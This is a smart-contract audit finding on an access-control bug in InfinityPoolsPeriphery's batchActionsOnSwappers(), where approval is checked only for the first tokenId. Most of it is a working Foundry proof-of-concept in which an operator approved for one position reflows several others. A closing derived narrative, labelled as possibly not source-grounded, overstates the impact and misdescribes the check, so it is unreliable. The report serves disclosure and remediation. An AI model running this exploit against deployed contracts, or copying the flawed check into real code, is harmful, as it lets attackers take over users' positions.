---
id: 4765
severity: "High"
---

# Insufficient access control in the batchActionsOnSwappers() function Submitted by Spearmint, also found by ZC002 and Saksham seth

## Description

The docs clearly state under the permissions subheading the following:
InfinityPoolsPeriphery ensures that only authorized users can manipulate a position associated with a specific tokenId. Either the caller must be the NFT owner, or the owner must have assigned the caller as the NFT operator.
The definition for an NFT operator according to ERC-721 is as follows:
The operator can manage all NFTs of the owner.
The NFT operator is someone that has been granted approval over ALL tokenIds of the owner. The issue is that in the batchActionsOnSwappers() function, it only checks if the msg.sender is approved over the first tokenId in the list. For all subsequent tokenIds it simply checks that the owner is the same even if they are not approved to the msg.sender.
This opens up the following attack vector:
1. Alice opens 10 swapper positions.
2. Alice approves bob over position 1.
3. Bob now calls reflow, unwind etc. on ALL of Alice's positions even though he is only approved for one of them.

## Proof of Concept

Add the following base contract to test/cantina:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;
import {Test, console, stdError} from "forge-std/Test.sol";
import {InfinityPoolsFactory} from "src/InfinityPoolsFactory.sol";
import {Token} from "src/mock/Token.sol";
import {Quad, fromUint256} from "src/types/ABDKMathQuad/Quad.sol";
import {InfinityPool} from "src/InfinityPool.sol";
import {EPOCH} from "src/Constants.sol";
import {InfinityPoolsPeriphery, IPermit2} from "src/periphery/InfinityPoolsPeriphery.sol";
import {WETH9} from "src/periphery/mock/WETH9.sol";
import {IInfinityPoolsPeriphery} from "src/periphery/interfaces/IInfinityPoolsPeriphery.sol";
contract CorrectInfinityPoolsBase is Test {
    Token token0;
    Token token1;
    Token tokenBiggerThanWethImpl;
    Token tokenBiggerThanWeth;
    InfinityPoolsFactory infinityPoolsFactory;
    InfinityPool infinityPool;
    InfinityPoolsPeriphery infinityPoolsPeriphery;
    InfinityPool infinityPoolWeth;
    WETH9 WETH;
    // IERC20 version of WETH
    Token Ierc20Weth;

    function setUp() public virtual {
        vm.warp(uint256(EPOCH) + 1 days);
        token0 = new Token("Token0", "TOK0", 18);
        token1 = new Token("Token1", "TOK1", 18);
        WETH = new WETH9();
        Ierc20Weth = Token(address(WETH));
        // I needed WETH to be token0 to keep the test simple
        tokenBiggerThanWethImpl = new Token("TokenBIG", "TOKB", 18);
        bytes memory code = address(tokenBiggerThanWethImpl).code;
        address targetAddr = 0xf62849F9A0b5bF2913B396098f7c7019B51A820b;
        vm.etch(targetAddr, code);
        tokenBiggerThanWeth = Token(0xf62849F9A0b5bF2913B396098f7c7019B51A820b);
        infinityPoolsFactory = new InfinityPoolsFactory();
        infinityPoolsFactory.createPool(address(token0), address(token1), 15);
        address pool = infinityPoolsFactory.getPool(address(token0), address(token1), 15);
        assertTrue(pool != address(0));
        infinityPoolsFactory.createPool(address(WETH), address(token1), 15);
        infinityPool = InfinityPool(pool);
        infinityPoolsFactory.createPool(address(WETH), address(tokenBiggerThanWeth), 15);
        address poolWeth = infinityPoolsFactory.getPool(address(WETH), address(tokenBiggerThanWeth), 15);
        Quad startPrice = fromUint256(1);
        Quad quadVar = fromUint256(1);
        infinityPoolWeth = InfinityPool(poolWeth);
        infinityPoolWeth.setInitialPriceAndVariance(fromUint256(10000000), fromUint256(100));
        infinityPool.setInitialPriceAndVariance(startPrice, quadVar);
        infinityPoolsPeriphery = new InfinityPoolsPeriphery();
        infinityPoolsPeriphery.initialize(address(infinityPoolsFactory), address(WETH), IPermit2(0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045));
    }
}
```
Add the following test to test/cantina:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;
import {InfinityPoolsBase} from "test/cantina/InfinityPoolsBase.t.sol";
import {CorrectInfinityPoolsBase} from "test/cantina/CorrectBase.t.sol";
import {Quad, fromUint256, LibOptQuad} from "src/types/ABDKMathQuad/Quad.sol";
import {Test, console, stdError} from "forge-std/Test.sol";
import {InfinityPool} from "src/InfinityPool.sol";
import {Token} from "src/mock/Token.sol";
import {IInfinityPool} from "src/interfaces/IInfinityPool.sol";
import {InfinityPoolState} from "src/InfinityPoolState.sol";
import {Spot} from "src/libraries/external/Spot.sol";
import {InfinityPoolsPeriphery, IPermit2} from "src/periphery/InfinityPoolsPeriphery.sol";
import {NewLoan} from "src/libraries/external/NewLoan.sol";
import {OPT_INT256_NONE, OptInt256, wrap} from "src/types/Optional/OptInt256.sol";
import "src/types/ABDKMathQuad/Constants.sol";
contract OperatorCheckWrong is CorrectInfinityPoolsBase {
    address alice;
    address bob;

    function setUp() public override {
        super.setUp();
        // Setup alice and bob
        alice = address(444);
        bob = address(8888888);
        token0.mint(alice, 10e30);
        token1.mint(alice, 10e30);
        token0.mint(bob, 10e30);
        token1.mint(bob, 10e30);
        vm.startPrank(alice);
        token0.approve(address(infinityPool), 10e30);
        token1.approve(address(infinityPool), 10e30);
        token0.approve(address(infinityPoolsPeriphery), 10e30);
        token1.approve(address(infinityPoolsPeriphery), 10e30);
        vm.startPrank(bob);
        token0.approve(address(infinityPoolsPeriphery), 10e30);
        token1.approve(address(infinityPoolsPeriphery), 10e30);
        // add liquidity so that we can call `newLoan`
        vm.startPrank(alice);
        (, int256 token0Input, int256 token1Input,) = infinityPool.pour(0, 4096, fromUint256(1e5), "");
    }

    function test__ApprovedForOneIdWeCanAbuseOtherIds() external {
        // Alice deposits collateral so that she can open some positions
        vm.startPrank(alice);
        infinityPoolsPeriphery.depositERC20(token0, alice, 10e22, false, 0, 0, "");
        infinityPoolsPeriphery.addCollateral(address(token0), address(token1), token0, alice, 10e22);
        infinityPoolsPeriphery.depositERC20(token1, alice, 10e22, false, 0, 0, "");
        infinityPoolsPeriphery.addCollateral(address(token0), address(token1), token1, alice, 10e22);
        // Alice opens 8 positions
        Quad[] memory owedPotential = new Quad[](1);
        owedPotential[0] = fromUint256(1e2); // Example value, adjust as needed
        NewLoan.NewLoanParams memory params = NewLoan.NewLoanParams({
            owedPotential: owedPotential,
            startBin: 10,
            strikeBin: 10,
            tokenMix: POSITIVE_ZERO,
            lockinEnd: POSITIVE_INFINITY,
            deadEra: OptInt256.wrap(OPT_INT256_NONE),
            token: false,
            twapUntil: OptInt256.wrap(OPT_INT256_NONE)
        });
        // Create SwapInfo struct
        InfinityPoolsPeriphery.SwapInfo memory swapInfo = InfinityPoolsPeriphery.SwapInfo({
            swapForwarder: address(infinityPoolsPeriphery.generalSwapForwarder()),
            tokenInSpender: alice,
            to: alice,
            data: ""
        });
        infinityPoolsPeriphery.newLoan(address(token1), address(token0), 15, alice, swapInfo, params);
        infinityPoolsPeriphery.newLoan(address(token1), address(token0), 15, alice, swapInfo, params);
        infinityPoolsPeriphery.newLoan(address(token1), address(token0), 15, alice, swapInfo, params);
        infinityPoolsPeriphery.newLoan(address(token1), address(token0), 15, alice, swapInfo, params);
        infinityPoolsPeriphery.newLoan(address(token1), address(token0), 15, alice, swapInfo, params);
        infinityPoolsPeriphery.newLoan(address(token1), address(token0), 15, alice, swapInfo, params);
        infinityPoolsPeriphery.newLoan(address(token1), address(token0), 15, alice, swapInfo, params);
        infinityPoolsPeriphery.newLoan(address(token1), address(token0), 15, alice, swapInfo, params);
        // Alice approves bob over the first swapper position so that he can manage ONLY that one
        infinityPoolsPeriphery.approve(bob, 657951427778920353644499665832551859006732217580493266048093534433549746176);
        // Bob sees an opportunity to mess with ALL of alice's positions
        // Not only the one he is approved for.
        // In this POC I am going to show how bob can call `reflow` on positions
        // he is not approved for
        // Note that bob could call any other swapper action on any of alice's positions
        vm.startPrank(bob);
        uint256[] memory unwindTokenIds = new uint256[](0);
        InfinityPoolsPeriphery.ReflowParams[] memory reflowParams = new InfinityPoolsPeriphery.ReflowParams[](5);
        // Bob is approved over this ID
        reflowParams[0] = InfinityPoolsPeriphery.ReflowParams(657951427778920353644499665832551859006732217580493266048093534433549746176, POSITIVE_ZERO, false, OPT_INT256_NONE);
        // Bob is NOT approved for any of the following IDs
        reflowParams[1] = InfinityPoolsPeriphery.ReflowParams(657951427778920353644499665832551859006732217580493266048093534433549746177, POSITIVE_ZERO, false, OPT_INT256_NONE);
        reflowParams[2] = InfinityPoolsPeriphery.ReflowParams(657951427778920353644499665832551859006732217580493266048093534433549746178, POSITIVE_ZERO, false, OPT_INT256_NONE);
        reflowParams[3] = InfinityPoolsPeriphery.ReflowParams(657951427778920353644499665832551859006732217580493266048093534433549746179, POSITIVE_ZERO, false, OPT_INT256_NONE);
        reflowParams[4] = InfinityPoolsPeriphery.ReflowParams(657951427778920353644499665832551859006732217580493266048093534433549746180, POSITIVE_ZERO, false, OPT_INT256_NONE);
        NewLoan.NewLoanParams[] memory newLoanParams = new NewLoan.NewLoanParams[](0);
        infinityPoolsPeriphery.batchActionsOnSwappers(unwindTokenIds, reflowParams, newLoanParams, swapInfo);
    }
}
```
Console output:
Ran 1 test for test/cantina/ApprovedForOneMessUpaAll.t.sol:OperatorCheckWrong
[PASS] test__ApprovedForOneIdWeCanAbuseOtherIds() (gas: 18496888)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 64.94ms (51.41ms CPU time)
Ran 1 test suite in 69.99ms (64.94ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)

## Recommendation

Check that the msg.sender is the NFT operator using the isApprovedForAll() function.
3.2

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability is an authorization bypass in the batchActionsOnSwappers function of the InfinityPoolsPeriphery contract. The function is intended to allow an operator who has been granted permission over a specific NFT (or all NFTs of an owner) to perform actions such as reflow, unwind or newLoan on that NFT. However, the implementation only verifies that the caller is approved for the first tokenId supplied in the batch and then assumes the same approval applies to every subsequent tokenId, checking only that the caller is the owner of those tokens. Because ERC‑721 defines an operator as someone approved for all tokenIds of an owner, the correct check must be performed for each tokenId individually using isApprovedForAll or the standard _isApprovedOrOwner logic. The root cause is a faulty loop that skips the per‑token approval verification after the first element. An attacker can exploit this by obtaining approval for a single NFT from a victim and then calling batchActionsOnSwappers with a list that includes many other tokenIds owned by the same victim. The attacker can invoke reflow, unwind, or any other swapper action on all of the victim’s positions, effectively taking control of collateral, forcing unwanted rebalances, or draining funds. The impact is that the victim’s positions may be altered without consent, leading to loss of collateral, unexpected token transfers, or disruption of the protocol’s accounting. This condition occurs whenever a batch operation is executed with more than one tokenId and the caller has operator rights for only the first ID. All NFT owners who rely on the per‑token approval model are affected, as are the protocol’s overall security guarantees and any users’ funds locked in those positions. The issue was discovered during a security audit and reproduced with a concrete proof‑of‑concept test that demonstrated an approved operator manipulating unrelated positions. The bug is subtle because the function name suggests a batch operation and developers may assume that a single approval check suffices for the whole batch, making the missing per‑token verification easy to overlook. To remediate, the contract should iterate over each tokenId in the batch and verify that the caller is either the owner or an approved operator for that specific tokenId, using the ERC‑721 isApprovedForAll or _isApprovedOrOwner checks for every element. This ensures that only authorized parties can act on each individual position and restores the intended access control model.
